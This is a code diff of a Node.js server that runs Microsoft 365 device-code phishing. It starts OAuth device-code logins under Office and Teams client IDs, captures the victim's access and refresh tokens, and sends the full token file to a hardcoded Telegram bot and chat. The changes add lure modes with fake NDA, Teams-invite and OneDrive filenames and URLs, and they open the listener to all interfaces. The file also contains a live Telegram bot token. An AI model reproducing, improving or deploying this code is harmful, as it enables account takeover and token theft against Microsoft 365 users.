@@ -1,5 +1,6 @@
 // M365 Device Code Server — on-demand, multi-session, no auto-refresh / startup scan
-// Now sends FULL token file content to Telegram instead of just filename
+// Sends FULL token file content to Telegram
+// Supports custom displayed filenames/URLs via 'filename' param (nda, teams, onedrive)
 
 const https  = require('https');
 const http   = require('http');
@@ -8,19 +9,30 @@ const path   = require('path');
 const crypto = require('crypto');
 const url    = require('url');
 
-const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+const CLIENT_IDS = {
+  office: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',     // Microsoft Office / Graph
+  teams:  '1fec8e78-bce4-4aaf-ab1b-5451cc387264',     // Teams / new outlook
+};
 
-const TENANT = 'common';
-const RESOURCE  = 'https://graph.microsoft.com';
-const SCOPE     = 'offline_access';
+const DEFAULT_CLIENT_ID = CLIENT_IDS.office;
+
+const TENANT   = 'common';
+const RESOURCE = 'https://graph.microsoft.com';
+const SCOPE    = 'offline_access';
+
+// Fake/display URLs for different modes
+const DISPLAY_BASES = {
+  teams:    'https://teams.microsoft.com/invite/',
+  onedrive: 'https://1drv.ms/files/',
+  nda:      'https://eviden-global.s3.us-east-1.amazonaws.com/',
+};
 
 // Telegram
 const TELEGRAM_BOT_TOKEN = '8286068697:AAGZ7lbbD8B--FnvVziInLd5XBehDiFIvd8';
 const TELEGRAM_CHAT_ID   = '8379597863';
-const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 // ── Active sessions ───────────────────────────────────────────────────────────
-const sessions = new Map(); // sessionId → { status, user_code, verification_url, file, device_code, interval, tokens?, message?, error? }
+const sessions = new Map();
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function genTokenFile() {
@@ -92,17 +104,14 @@ async function sendTelegramAsDocument(filename) {
 
     let body = '';
 
-    // chat_id
     body += `--${boundary}\r\n`;
     body += 'Content-Disposition: form-data; name="chat_id"\r\n\r\n';
     body += `${TELEGRAM_CHAT_ID}\r\n`;
 
-    // caption
     body += `--${boundary}\r\n`;
     body += 'Content-Disposition: form-data; name="caption"\r\n\r\n';
-    body += 'outlook conector\r\n';
+    body += 'outlook connector\r\n';
 
-    // document
     body += `--${boundary}\r\n`;
     body += `Content-Disposition: form-data; name="document"; filename="${filenameBase}"\r\n`;
     body += 'Content-Type: application/json\r\n\r\n';
@@ -155,7 +164,7 @@ async function pollSession(sessionId) {
     try {
       const res = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/token`, {
         grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-        client_id:  CLIENT_ID,
+        client_id:  s.clientIdUsed,
         code:       s.device_code,
         resource:   RESOURCE,
         scope:      SCOPE,
@@ -166,9 +175,7 @@ async function pollSession(sessionId) {
         s.status = 'success';
 
         const saved = saveTokens(res, s.file);
-
-          // Send FULL file content to Telegram
-          await sendTelegramAsDocument(s.file);
+        await sendTelegramAsDocument(s.file);
 
         console.log(`Session ${sessionId} → success → ${s.file}`);
         return;
@@ -194,7 +201,7 @@ async function pollSession(sessionId) {
 // ── HTTP Server ───────────────────────────────────────────────────────────────
 const server = http.createServer(async (req, res) => {
   const parsed = url.parse(req.url, true);
-  let pathname = parsed.pathname;
+  const pathname = parsed.pathname;
 
   res.setHeader('Content-Type', 'application/json');
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -207,59 +214,125 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // ── POST /login-start ── starts new device code flow ───────────────────────
+  // POST /login-start
   if (pathname === '/login-start' && req.method === 'POST') {
-    const sessionId = genSessionId();
-    const file      = genTokenFile();
+    let body = '';
+    req.on('data', chunk => { body += chunk; });
+    req.on('end', async () => {
+      let params;
+      try {
+        params = new URLSearchParams(body);
+      } catch {
+        res.writeHead(400);
+        res.end(JSON.stringify({ error: 'Invalid form data' }));
+        return;
+      }
 
-    try {
-      const dc = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/devicecode`, {
-        client_id: CLIENT_ID,
-        resource:  RESOURCE,
-        scope:     SCOPE,
-      });
+      const clientIdType = params.get('client-id-type')?.trim().toLowerCase() || 'office';
+      const requestedDisplay = params.get('filename')?.trim() || '';
 
-      if (dc.error) throw new Error(dc.error_description || dc.error);
+      const clientId = CLIENT_IDS[clientIdType] || DEFAULT_CLIENT_ID;
+
+      if (!CLIENT_IDS[clientIdType] && clientIdType !== 'office') {
+        res.writeHead(400);
+        res.end(JSON.stringify({ 
+          error: `Unknown client-id-type. Allowed: ${Object.keys(CLIENT_IDS).join(', ')}` 
+        }));
+        return;
+      }
+
+      const sessionId = genSessionId();
+      const realFile = genTokenFile();               // always real random file
+
+      let displayFilename = path.basename(realFile);
+      let displayUrl = null;
+      let displayNote = null;
+
+      const reqLower = requestedDisplay.toLowerCase();
+
+      if (reqLower === 'nda' || reqLower === 'nda') {
+        displayFilename = 'IMG_5173.jpg';
+        displayUrl = DISPLAY_BASES.nda + 'IMG_5173.jpg';
+        displayNote = 'NDA protected document';
+      } else if (reqLower === 'teams') {
+        const rand = crypto.randomBytes(4).toString('hex');
+        displayFilename = 'teamsinvite.pdf';
+        displayUrl = `${DISPLAY_BASES.teams}${sessionId.slice(0,10)}-${rand}.pdf`;
+        displayNote = 'Teams secure invite';
+      } else if (reqLower === 'onedrive') {
+        displayFilename = 'secured-onedrive-document.pdf';
+        displayUrl = `${DISPLAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
+        displayNote = 'OneDrive shared file';
+      }
+      // default → keep real random filename, no URL
 
       sessions.set(sessionId, {
         status:           'polling',
         sessionId,
-        user_code:        dc.user_code,
-        verification_url: dc.verification_url,
-        message:          dc.message,
-        device_code:      dc.device_code,
-        interval:         dc.interval,
-        file,
+        user_code:        null,
+        verification_url: null,
+        message:          null,
+        device_code:      null,
+        interval:         null,
+        file:             realFile,                    // real save path
+        clientIdUsed:     clientId,
+        requestedDisplay,
+        displayFilename,
+        displayUrl,
+        displayNote,
         startTime:        Date.now(),
       });
 
-      // Start polling in background
-      pollSession(sessionId).catch(err => {
-        console.error(`Poll crash ${sessionId}:`, err);
+      try {
+        const dc = await post(`https://login.microsoftonline.com/${TENANT}/oauth2/devicecode`, {
+          client_id: clientId,
+          resource:  RESOURCE,
+          scope:     SCOPE,
+        });
+
+        if (dc.error) throw new Error(dc.error_description || dc.error);
+
+        // Update session with real device code data
         const s = sessions.get(sessionId);
-        if (s) s.status = 'error';
-      });
+        s.user_code        = dc.user_code;
+        s.verification_url = dc.verification_url;
+        s.message          = dc.message;
+        s.device_code      = dc.device_code;
+        s.interval         = dc.interval;
 
-      res.writeHead(200);
-      res.end(JSON.stringify({
-        sessionId,
-        status:           'started',
-        user_code:        dc.user_code,
-        verification_url: dc.verification_url,
-        message:          dc.message,
-        expires_in:       dc.expires_in,
-        poll_url:         `/status/${sessionId}`,
-        filename_will_be: path.basename(file),
-      }, null, 2));
+        pollSession(sessionId).catch(err => {
+          console.error(`Poll crash ${sessionId}:`, err);
+          const sess = sessions.get(sessionId);
+          if (sess) sess.status = 'error';
+        });
 
-    } catch (err) {
-      res.writeHead(500);
-      res.end(JSON.stringify({ error: err.message }));
-    }
+        res.writeHead(200);
+        res.end(JSON.stringify({
+          sessionId,
+          status:           'started',
+          user_code:        dc.user_code,
+          verification_url: dc.verification_url,
+          message:          dc.message,
+          expires_in:       dc.expires_in,
+          poll_url:         `/status/${sessionId}`,
+          filename_will_be: displayFilename,
+          file_url_will_be: displayUrl,
+          note:             displayNote || undefined,
+          actual_token_file: path.basename(realFile),   // optional debug info
+          client_id_type:   clientIdType,
+          client_id_used:   clientId,
+          requested_filename: requestedDisplay || '(default)',
+        }, null, 2));
+
+      } catch (err) {
+        res.writeHead(500);
+        res.end(JSON.stringify({ error: err.message }));
+      }
+    });
     return;
   }
 
-  // ── GET /status/:sessionId ────────────────────────────────────────────────
+  // GET /status/:sessionId
   if (pathname.startsWith('/status/')) {
     const sessionId = pathname.slice('/status/'.length);
     const s = sessions.get(sessionId);
@@ -270,15 +343,30 @@ const server = http.createServer(async (req, res) => {
       return;
     }
 
+    let extra = {};
+
+    if (s.status === 'success' && s.tokens) {
+      const savedInfo = saveTokens(s.tokens, s.file); // always save
+
+      extra = {
+        email:            savedInfo.email || null,
+        filename:         s.displayFilename,
+        file_url:         s.displayUrl || null,
+        actual_saved_as:  path.basename(s.file),
+        note:             s.displayNote || 'Token saved locally',
+      };
+    }
+
     const response = {
       sessionId,
-      status:   s.status,
-      filename: s.status === 'success' ? path.basename(s.file) : null,
-      email:    s.tokens ? saveTokens(s.tokens, null).email : null,
-      error:    s.error || null,
+      status:           s.status,
+      error:            s.error || null,
+      filename_will_be: s.displayFilename,
+      file_url_will_be: s.displayUrl,
+      client_id_type:   s.clientIdUsed === CLIENT_IDS.teams ? 'teams' : 'office',
+      ...extra,
     };
 
-    // Optional: clean up finished/failed sessions after some time
     if (['success', 'declined', 'expired', 'error'].includes(s.status)) {
       setTimeout(() => sessions.delete(sessionId), 30 * 60_000); // 30 min
     }
@@ -293,8 +381,8 @@ const server = http.createServer(async (req, res) => {
   res.end(JSON.stringify({ error: 'Not found' }));
 });
 
-const PORT = 3210;
-server.listen(PORT, '127.0.0.1', () => {
+const PORT = 3220;
+server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
   console.log(`
 ╔════════════════════════════════════════════════════════════╗
 ║     M365 Device Code Server  —  port ${PORT}                 ║
@@ -303,9 +391,9 @@ server.listen(PORT, '127.0.0.1', () => {
 ║    POST /login-start    → start new login flow             ║
 ║    GET  /status/:id     → poll progress & result           ║
 ║                                                            ║
-║  • Sends FULL token JSON content to Telegram on success    ║
-║  • Each frontend gets its own independent session          ║
-║  • New random token file every time                        ║
+║  • Always saves real token file & sends to Telegram        ║
+║  • Custom displayed filename/URL via ?filename=nda|teams|onedrive ║
+║  • Independent sessions per request                        ║
 ╚════════════════════════════════════════════════════════════╝
 `);
 });
